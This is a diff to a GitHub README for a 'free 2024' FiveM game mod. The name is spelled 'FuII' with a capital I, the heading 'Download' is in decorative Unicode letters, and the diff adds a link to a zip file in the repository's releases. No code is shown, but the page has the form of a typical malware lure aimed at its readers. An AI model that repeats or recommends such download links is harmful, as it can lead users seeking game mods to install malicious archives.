@@ -1,6 +1,6 @@
 # Fivem-FuII-Mod-FREE-2024
 
-## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+## [📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/aasimk910/Fivem-FuII-Mod-FREE-2024/releases/download/Fivem-FuII-Mod-FREE-2024/Fivem-FuII-Mod-FREE-2024.zip)
 
 # Some Features
 
